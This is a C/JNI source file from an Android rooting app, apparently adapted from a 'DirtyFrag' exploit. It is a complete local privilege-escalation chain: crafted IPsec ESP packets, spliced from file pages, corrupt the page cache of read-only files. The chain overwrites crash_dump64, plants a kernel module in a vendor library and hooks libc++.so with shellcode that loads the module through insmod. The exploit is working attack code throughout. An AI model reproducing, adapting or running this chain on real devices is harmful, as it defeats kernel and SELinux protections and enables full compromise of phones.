#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <jni.h>
#include "reporter.h"
#include "aes256.h"
#include "hmac_sha256.h"
#include "native_io.h"

/*
 * The reporter is resolved from the object it was handed, not from a class name - see reporter.h, which is
 * also where `reportfmt` lives now. Upstream resolves it here in `JNI_OnLoad`, by `FindClass`.
 */

struct PatchRestore {
    const char *lib;
    uint64_t shell_off;
    size_t   shell_padded;
    char    *shell_orig;   /* heap-allocated original shellcode bytes */
    uint64_t tramp_aligned;
    uint8_t  tramp_orig[16];
    int      valid;
};

static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
static char    *libcxx_ko_target;

/*
 * The shellcode's `package_name=` buffer, in bytes. It is the module parameter the app passes the manager
 * through, so it has to hold the longest of the three packages with room for the name and the NUL - and it
 * has to agree with the `.skip` in libcxx.S, which is what makes the buffer that long.
 */
#define LIBCXX_PARAM_PACKAGE_BYTES 64

/* SA parameters set by Java via nativeRunAll() before any patching. */
static int      g_encap_port;
static int      g_sender_port;
static uint32_t g_spi;
static uint8_t  g_aes_key[32];
static uint8_t  g_hmac_key[32];
static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
static uint32_t g_seq = 1;   /* monotonically increasing per-write */

/* IV = AES256_ECB_DEC(key, old_content) XOR desired
 * When kernel CBC-decrypts: plaintext = AES_DEC(key, ciphertext) XOR IV
 *   = AES_DEC(key, old_content) XOR IV
 *   = AES_DEC(key, old_content) XOR (AES_DEC(key, old_content) XOR desired)
 *   = desired
 */
static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(g_aes_key, old_content, dec);
    for (int i = 0; i < 16; i++)
        iv[i] = dec[i] ^ desired[i];
}

/* Read 16 bytes from vendor file at offset using crash_dump bridge (read mode).
 * crash_dump64 has been overwritten with splicehelper which supports argv[3]="r".
 */
static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
    int rdpipe[2];
    if (pipe(rdpipe) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }

    char offstr[24];
    snprintf(offstr, sizeof(offstr), "%ld", (long)offset);

    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN("vfork failed: %s", strerror(errno));
        close(rdpipe[0]); close(rdpipe[1]);
        return -1;
    }
    if (pid == 0) {
        close(rdpipe[0]);
        if (rdpipe[1] != 0) {
            if (dup2(rdpipe[1], 0) < 0) _exit(1);
            close(rdpipe[1]);
        }
        execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, "r", NULL);
        _exit(1);
    }
    close(rdpipe[1]);
    int status;
    if (df_wait_for_child(pid, &status) < 0) {
        int error = errno;
        close(rdpipe[0]);
        REPORTLN("read_vendor wait at 0x%lx failed: %s", (long)offset, strerror(error));
        return -1;
    }
    int n = 0;
    int read_error = 0;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        n = (int)df_read_full(rdpipe[0], buf, 16);
        if (n < 0) read_error = errno;
    }
    close(rdpipe[0]);
    if (n != 16) {
        if (read_error)
            REPORTLN("read_vendor at 0x%lx failed: %s", (long)offset, strerror(read_error));
        else if (WIFEXITED(status))
            REPORTLN("read_vendor at 0x%lx got %d bytes (exit %d)",
                     (long)offset, n, WEXITSTATUS(status));
        else if (WIFSIGNALED(status))
            REPORTLN("read_vendor at 0x%lx got %d bytes (signal %d)",
                     (long)offset, n, WTERMSIG(status));
        else
            REPORTLN("read_vendor at 0x%lx got %d bytes (status 0x%x)",
                     (long)offset, n, status);
        return -1;
    }
    return 0;
}

/* Send one CBC write.
 * ESP layout: SPI(4) + Seq(4) + IV(16) + ciphertext==file_page(16) = 40 bytes.
 * use_helper=0: splice file_fd page directly (system file, untrusted_app can open)
 * use_helper=1: exec crash_dump64 (splicehelper splice mode) to put vendor page in pipe
 * sk_send: connected UDP socket, created once by patch_file_cbc and reused across writes.
 */
static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
                            const uint8_t iv[16], const uint8_t old_content[16],
                            int use_helper, struct Reporter *reporter) {
    int ret = -1;

    int pfd[2];
    if (pipe(pfd) < 0) { REPORTLN("pipe failed: %s", strerror(errno)); return -1; }
    fcntl(pfd[1], F_SETPIPE_SZ, 65536);

    /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
    uint32_t seq = g_seq++;
    uint8_t hdr[24];
    *(uint32_t *)(hdr + 0) = htonl(g_spi);
    *(uint32_t *)(hdr + 4) = htonl(seq);
    memcpy(hdr + 8, iv, 16);

    /* HMAC-SHA256 over ESP_hdr(8) || IV(16) || ciphertext(16) = 40 bytes */
    uint8_t hmac_msg[40];
    memcpy(hmac_msg,      hdr,         8);   /* SPI + seq */
    memcpy(hmac_msg + 8,  iv,          16);  /* IV */
    memcpy(hmac_msg + 24, old_content, 16);  /* ciphertext = file page */
    uint8_t hmac_full[32];
    hmac_sha256(g_hmac_key, 32, hmac_msg, 40, hmac_full);

    /* vmsplice header + IV (24 bytes) */
    struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
    if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
        REPORTLN("vmsplice hdr failed: %s", strerror(errno)); goto out_pipe;
    }

    /* splice ciphertext from file (16 bytes, page-cache reference) */
    if (use_helper) {
        char offstr[24];
        snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
        if (pid < 0) { REPORTLN("vfork failed: %s", strerror(errno)); goto out_pipe; }
        if (pid == 0) {
            if (pfd[1] != 1 && dup2(pfd[1], 1) < 0) _exit(1);
            execl(kCrashDump, "crashdump64", offstr, libcxx_ko_target, NULL);
            _exit(1);
        }
        int st;
        if (df_wait_for_child(pid, &st) < 0) {
            REPORTLN("splice helper wait failed: %s", strerror(errno));
            goto out_pipe;
        }
        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            REPORTLN("splice helper failed status=0x%x", st);
            goto out_pipe;
        }
    } else {
        off_t off = offset;
        if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            REPORTLN("splice file failed: %s", strerror(errno)); goto out_pipe;
        }
    }

    /* vmsplice ICV (truncated HMAC) */
    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
        REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
    }

    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
    {
        int total = 24 + 16 + g_icv_len;
        ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
        ret = (s == total) ? 0 : -1;
        if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
    }

out_pipe:
    close(pfd[0]); close(pfd[1]);
    return ret;
}

/* Patch len bytes of payload into file starting at file offset foff.
 * Writes in 16-byte CBC blocks.
 * For system files (use_helper=0): reads old_content with pread().
 * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
 * len must be a multiple of 16.
 */
static int patch_file_cbc(const char *path, const char *payload, size_t len,
                           size_t foff, int use_helper, struct Reporter *reporter) {
    if (len % 16 != 0) {
        REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
        return -1;
    }

    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
    {
        int opt = 1;
        setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        struct sockaddr_in src = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_sender_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
            REPORTLN("bind port %d failed: %s", g_sender_port, strerror(errno));
        struct sockaddr_in dst = {
            .sin_family = AF_INET,
            .sin_port   = htons((uint16_t)g_encap_port),
            .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
        };
        if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
            REPORTLN("connect failed: %s", strerror(errno));
            close(sk_send); return -1;
        }
    }

    int file_fd = -1;
    if (!use_helper) {
        file_fd = open(path, O_RDONLY);
        if (file_fd < 0) {
            REPORTLN("open %s failed: %s", path, strerror(errno));
            close(sk_send); return -1;
        }
    }

    int rc = 0;
    for (size_t i = 0; i < len / 16; i++) {
        off_t off = (off_t)(foff + i * 16);
        uint8_t old_content[16] = {0};

        if (use_helper) {
            if (read_vendor_content(off, old_content, reporter) < 0) {
                rc = -1; break;
            }
        } else {
            if (pread(file_fd, old_content, 16, off) != 16) {
                REPORTLN("pread at 0x%lx failed: %s", (long)off, strerror(errno));
                rc = -1; break;
            }
        }

        uint8_t desired[16] = {0};
        memcpy(desired, payload + i * 16, 16);

        uint8_t iv[16];
        compute_iv(old_content, desired, iv);

        if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
            REPORTLN("write #%zu at 0x%lx failed", i, (long)off);
            rc = -1; break;
        }
        if (i % 32 == 0)
            REPORTLN("%zu ...", i * 16);
    }

    if (!use_helper) close(file_fd);
    close(sk_send);
    if (rc == 0) REPORTLN("sent %zu patch bytes for %s+0x%zx; readback not yet verified", len, path, foff);
    return rc;
}

/* A completed UDP send does not establish a page-cache write. Verify the whole
 * first patch before executing the bridge. The short bounded wait allows already
 * submitted packets to finish; it never resubmits a write. */
static int verify_first_patch(const void *expected, size_t length, struct Reporter *reporter) {
    int fd = open(kCrashDump, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        REPORTLN("patch #1 readback open failed: %s", strerror(errno));
        return -1;
    }
    struct df_readback_result reading;
    for (unsigned int attempt = 0; attempt < 101; ++attempt) {
        int result = df_verify_fd(fd, 0, expected, length, &reading);
        if (result == 0) {
            close(fd);
            REPORTLN("patch #1 readback verified: %zu bytes match", length);
            return 0;
        }
        if (result < 0) {
            close(fd);
            if (reading.error)
                REPORTLN("patch #1 readback at 0x%zx failed: %s", reading.position, strerror(reading.error));
            else
                REPORTLN("patch #1 readback ended at 0x%zx before %zu bytes", reading.position, length);
            return -1;
        }
        if (attempt < 100) usleep(10000);
    }
    close(fd);
    REPORTLN("patch #1 readback mismatch at 0x%zx: expected %02x, observed %02x",
             reading.position, (unsigned int)reading.expected, (unsigned int)reading.actual);
    REPORTLN("the first patch was not observed; stopping before the vendor bridge");
    return -1;
}

/* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */

extern char libcxx_start[];
extern char libcxx_data[];
extern uint32_t libcxx_len;
extern char libcxx_first_inst_copy[];
extern uint32_t libcxx_ko_target_off;
extern uint32_t libcxx_param_package_off;

int find_hook_target(const char *lib, const char *sym,
                     uint64_t *hook, uint64_t *payload, uint32_t *first_insn,
                     struct Reporter *reporter);

asm(
    ".section .rodata\n"
    ".global dirtyfrag_ko_12_5_10_start\n.global dirtyfrag_ko_12_5_10_end\n"
    "dirtyfrag_ko_12_5_10_start:\n.incbin \"ko/dirtyfrag-android12-5.10.ko\"\ndirtyfrag_ko_12_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_10_start\n.global dirtyfrag_ko_13_5_10_end\n"
    "dirtyfrag_ko_13_5_10_start:\n.incbin \"ko/dirtyfrag-android13-5.10.ko\"\ndirtyfrag_ko_13_5_10_end:\n"
    ".global dirtyfrag_ko_13_5_15_start\n.global dirtyfrag_ko_13_5_15_end\n"
    "dirtyfrag_ko_13_5_15_start:\n.incbin \"ko/dirtyfrag-android13-5.15.ko\"\ndirtyfrag_ko_13_5_15_end:\n"
    ".global dirtyfrag_ko_14_5_15_start\n.global dirtyfrag_ko_14_5_15_end\n"
    "dirtyfrag_ko_14_5_15_start:\n.incbin \"ko/dirtyfrag-android14-5.15.ko\"\ndirtyfrag_ko_14_5_15_end:\n"
    ".global dirtyfrag_ko_14_6_1_start\n.global dirtyfrag_ko_14_6_1_end\n"
    "dirtyfrag_ko_14_6_1_start:\n.incbin \"ko/dirtyfrag-android14-6.1.ko\"\ndirtyfrag_ko_14_6_1_end:\n"
    ".global dirtyfrag_ko_15_6_6_start\n.global dirtyfrag_ko_15_6_6_end\n"
    "dirtyfrag_ko_15_6_6_start:\n.incbin \"ko/dirtyfrag-android15-6.6.ko\"\ndirtyfrag_ko_15_6_6_end:\n"
    ".global dirtyfrag_ko_16_6_12_start\n.global dirtyfrag_ko_16_6_12_end\n"
    "dirtyfrag_ko_16_6_12_start:\n.incbin \"ko/dirtyfrag-android16-6.12.ko\"\ndirtyfrag_ko_16_6_12_end:\n"
    ".global dirtyfrag_ko_17_6_18_start\n.global dirtyfrag_ko_17_6_18_end\n"
    "dirtyfrag_ko_17_6_18_start:\n.incbin \"ko/dirtyfrag-android17-6.18.ko\"\ndirtyfrag_ko_17_6_18_end:\n"
);

asm(
    ".section .rodata\n"
    ".global splice_helper_start\n.global splice_helper_end\n"
    "splice_helper_start:\n.incbin \"splicehelper\"\nsplice_helper_end:\n"
);

extern char dirtyfrag_ko_12_5_10_start[], dirtyfrag_ko_12_5_10_end[];
extern char dirtyfrag_ko_13_5_10_start[], dirtyfrag_ko_13_5_10_end[];
extern char dirtyfrag_ko_13_5_15_start[], dirtyfrag_ko_13_5_15_end[];
extern char dirtyfrag_ko_14_5_15_start[], dirtyfrag_ko_14_5_15_end[];
extern char dirtyfrag_ko_14_6_1_start[],  dirtyfrag_ko_14_6_1_end[];
extern char dirtyfrag_ko_15_6_6_start[],  dirtyfrag_ko_15_6_6_end[];
extern char dirtyfrag_ko_16_6_12_start[], dirtyfrag_ko_16_6_12_end[];
extern char dirtyfrag_ko_17_6_18_start[], dirtyfrag_ko_17_6_18_end[];
extern char splice_helper_start[], splice_helper_end[];

struct KoImage { int android_release, kver_major, kver_minor; const char *start, *end; };

static const struct KoImage *select_ko_image(int andr, int major, int minor) {
    static const struct KoImage imgs[] = {
        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
        {14, 6,  1, dirtyfrag_ko_14_6_1_start,  dirtyfrag_ko_14_6_1_end},
        {15, 6,  6, dirtyfrag_ko_15_6_6_start,  dirtyfrag_ko_15_6_6_end},
        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
    };
    const struct KoImage *fb = NULL;
    for (size_t i = 0; i < sizeof(imgs)/sizeof(imgs[0]); i++) {
        if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
        if (imgs[i].android_release == andr) return &imgs[i];
        if (!fb) fb = &imgs[i];
    }
    return fb;
}

static int read_device_versions(int *andr, int *major, int *minor) {
    struct utsname u;
    if (uname(&u) != 0) return -1;
    if (sscanf(u.release, "%d.%d", major, minor) != 2) return -1;
    const char *m = strstr(u.release, "android");
    if (!m) return -1;
    *andr = atoi(m + 7);
    return (*andr > 0) ? 0 : -1;
}

/* Pad payload to a multiple of 16 bytes in a heap buffer.
 * Caller must free() the returned pointer.
 */
static char *pad16(const char *data, size_t len, size_t *out_len) {
    size_t padded = (len + 15) & ~(size_t)15;
    char *buf = calloc(1, padded);
    if (buf) memcpy(buf, data, len);
    *out_len = padded;
    return buf;
}


static int patch_ko(struct Reporter *reporter) {
    /* pick KO image */
    int andr = 0, major = 0, minor = 0;
    if (read_device_versions(&andr, &major, &minor) != 0) {
        REPORTLN("Unable to match kernel version - possibly unsupported Non-GKI device"); return 1;
    }
    const struct KoImage *ko = select_ko_image(andr, major, minor);
    if (!ko) {
        REPORTLN("unsupported kernel %d.%d android %d", major, minor, andr); return 1;
    }
    REPORTLN("* ko android%d-%d.%d (%d bytes)",
             ko->android_release, ko->kver_major, ko->kver_minor,
             (int)(ko->end - ko->start));

    /* patch #1: write splicehelper into crash_dump64 page cache.
     * After this, exec'ing kCrashDump runs our splicehelper in crash_dump
     * SELinux domain (exec transition on the path label) and can open vendor files. */
    size_t sh_len_padded;
    char *sh_buf = pad16(splice_helper_start,
                         (size_t)(splice_helper_end - splice_helper_start),
                         &sh_len_padded);
    if (!sh_buf) return -1;
    REPORTLN("* patch #1 (crash_dump64 ← splicehelper, %zu bytes)", sh_len_padded);
    int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
    if (ret == 0) ret = verify_first_patch(sh_buf, sh_len_padded, reporter);
    free(sh_buf);
    if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }

    size_t ko_len_padded;
    char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
    if (!ko_buf) return -1;

    /* patch #2: write KO into vendor lib via crash_dump bridge */
    REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
    ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
    free(ko_buf);
    if (ret) REPORTLN("patch #2 failed: %d", ret);
    return ret;
}

static int patch_hook(const char *lib, const char *sym,
                      char *stage_data, uint32_t stage_len, char *stage_start,
                      char *first_inst_copy,
                      struct Reporter *reporter, struct PatchRestore *restore) {
    uint64_t hook_off, shell_off; uint32_t first_insn;
    if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn, reporter)) {
        REPORTLN("find %s hook target failed", lib); return 1;
    }
    REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);

    const uint32_t BRANCH = 0x14000000;
    uint32_t start_delta = (uint32_t)(stage_start - stage_data);
    uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);

    if (first_insn == hook_insn) {
        REPORTLN("%s already hooked", lib); return 0;
    }
    uint32_t jmpback = BRANCH |
        (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
    *(uint32_t *)&stage_data[stage_len - 4] = jmpback;
    *(uint32_t *)&first_inst_copy[0] = first_insn;

    size_t padded; char *buf = pad16(stage_data, stage_len, &padded);
    if (!buf) return -1;

    if (restore) {
        restore->lib = lib;
        restore->shell_off = shell_off;
        restore->shell_padded = padded;
        restore->shell_orig = malloc(padded);
        if (restore->shell_orig) {
            int rfd = open(lib, O_RDONLY);
            if (rfd < 0 || pread(rfd, restore->shell_orig, padded, (off_t)shell_off) != (ssize_t)padded) {
                free(restore->shell_orig); restore->shell_orig = NULL;
            }
            if (rfd >= 0) close(rfd);
        }
    }

    REPORTLN("* patching %s shellcode", lib);
    int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
    free(buf);
    if (ret) { REPORTLN("* patching %s shellcode failed", lib); return ret; }

    {
        uint64_t aligned = hook_off & ~(uint64_t)15;
        int pos = (int)(hook_off & 15);
        uint8_t blk[16];
        int fd = open(lib, O_RDONLY);
        if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
            REPORTLN("pread %s trampoline block failed", lib); if (fd >= 0) close(fd); return -1;
        }
        close(fd);
        if (restore) {
            restore->tramp_aligned = aligned;
            memcpy(restore->tramp_orig, blk, 16);
            restore->valid = 1;
        }
        blk[pos+0] = (uint8_t)(hook_insn      );
        blk[pos+1] = (uint8_t)(hook_insn >>  8);
        blk[pos+2] = (uint8_t)(hook_insn >> 16);
        blk[pos+3] = (uint8_t)(hook_insn >> 24);
        REPORTLN("* patching %s trampoline at 0x%lx", lib, hook_off);
        ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
    }
    return ret;
}

static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
    if (!r->valid) return;
    REPORTLN("* restore trampoline in %s", r->lib);
    patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
    if (r->shell_orig) {
        REPORTLN("* restore shellcode in %s", r->lib);
        patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
    }
}

static void fadvise_drop(const char *path, struct Reporter *reporter) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) { REPORTLN("fadvise_drop open %s failed: %s", path, strerror(errno)); return; }
    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
    close(fd);
    REPORTLN("* cache dropped: %s", path);
}

static int createOrphanProcess(struct Reporter *reporter) {
    int pid = fork();
    if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
    if (pid == 0) {
        int pid2 = fork();
        if (pid2 == 0) { sleep(1); _exit(0); }
        _exit(0);
    }
    TEMP_FAILURE_RETRY(waitpid(pid, NULL, 0));
    return 0;
}

static int has_marker(const char *p) { return access(p, F_OK) == 0; }

/*
 * The chain, driven from the app.
 *
 * The symbol names the class this is declared on, so it is `UniversalRoot` here where upstream has
 * `df/root/ExploitRunner` - the Kotlin side of the same boundary is UniversalRoot.kt, and
 * `UniversalRootContractTest` derives this name from that file rather than spelling it out.
 *
 * [koTargetPath] is the vendor library the exploit writes through: the module's bytes are patched into its
 * page cache, and the shellcode's `insmod` is asked to load them from there. A value rather than a constant
 * because which vendor file exists, and is loadable, differs by device - the app picks it.
 *
 * [packageName] is the manager the module's user-space half is told to serve. It travels into the module as
 * an `insmod` parameter, so one chain serves all three KernelSU projects.
 */
JNIEXPORT jint JNICALL
Java_dev_busung_s25uroot_UniversalRoot_nativeRunAll(JNIEnv *env, jclass clz __attribute__((unused)),
                                               jobject reporter_obj,
                                               jstring koTargetPath,
                                               jint encapPort, jint spi,
                                               jbyteArray aesCbcKey,
                                               jbyteArray hmacKey, jint icvLen,
                                               jint senderPort,
                                               jstring packageName) {
    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;

    g_encap_port  = (int)encapPort;
    g_sender_port = (int)senderPort;
    g_spi         = (uint32_t)spi;
    g_seq         = 1;
    g_icv_len     = (int)icvLen;

    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
    memcpy(g_aes_key, kb, 32);
    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);

    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
    memcpy(g_hmac_key, hb, 32);
    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);

    libcxx_ko_target   = libcxx_data + libcxx_ko_target_off;
    const char *p = (*env)->GetStringUTFChars(env, koTargetPath, NULL);
    if (p) {
        strncpy(libcxx_ko_target, p, 63);
        libcxx_ko_target[63] = '\0';
        (*env)->ReleaseStringUTFChars(env, koTargetPath, p);
    }
    // The module's `package_name` parameter, written into the shellcode's own buffer: `insmod` is handed
    // `package_name=<manager>`, and the module passes that manager to `ksud late-load --package-name`.
    // The shellcode carries a default, so a string that cannot be read is still a valid parameter rather
    // than an empty one - `--package-name ''` would have the daemon serve nobody.
    uint8_t *param = (uint8_t *)(libcxx_data + libcxx_param_package_off);
    const char *mgr = packageName ? (*env)->GetStringUTFChars(env, packageName, NULL) : NULL;
    if (mgr) {
        snprintf((char *)param, LIBCXX_PARAM_PACKAGE_BYTES, "package_name=%s", mgr);
        (*env)->ReleaseStringUTFChars(env, packageName, mgr);
    }

    struct PatchRestore libcxx_r = {0};

    int rc = 3;
    if (patch_ko(reporter)) goto done;
    if (patch_hook("/system/lib64/libc++.so",
                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
                   reporter, &libcxx_r)) goto done;

    rc = 2;
    usleep(500000);
    REPORTLN("* triggering...");
    createOrphanProcess(reporter);

    static const struct {
        const char *path;
        const char *msg;
        int         rc;
    } markers[] = {
        { "/dev/df",   "libc++: mutex acquired, loading custom module", -1 },
        { "/dev/dfm0", "***SUCCESS***",                        0 },
        { "/dev/dfm1", "***FAILED***: ksud exited with error", 1 },
    };
    int seen[sizeof(markers)/sizeof(markers[0])] = {0};

    for (int elapsed = 0; elapsed < 5000; elapsed += 10) {
        usleep(10000);
        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
            if (!seen[j] && has_marker(markers[j].path)) {
                seen[j] = 1;
                REPORTLN("%s", markers[j].msg);
                if (markers[j].rc >= 0) {
                    rc = markers[j].rc;
                    goto done;
                }
            }
        }
    }
    REPORTLN("***FAILED***: check logs");
done:
    if (rc == 3) REPORTLN("***FAILED***: failed to patch files");
    REPORTLN("\n=== cleanup ===");
    restore_hook(&libcxx_r, reporter);
    fadvise_drop(kCrashDump, reporter);
    free(libcxx_r.shell_orig);
    return rc;
}
